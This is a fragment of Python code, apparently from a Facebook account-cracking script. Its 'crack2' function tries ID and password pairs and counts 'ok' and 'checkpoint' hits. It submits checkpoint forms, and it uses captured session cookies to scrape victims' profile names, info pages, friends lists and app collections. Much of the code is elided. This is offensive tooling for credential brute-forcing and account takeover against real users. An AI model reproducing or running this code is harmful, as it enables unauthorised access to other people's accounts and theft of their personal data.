		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					get_id = session.get("https://free.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://free.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://free.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					...
					response4 = session.get(f"https://free.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s •UMAIR• %s/%s ••• ok*%s ••• cp*%s ••• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://m.basic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
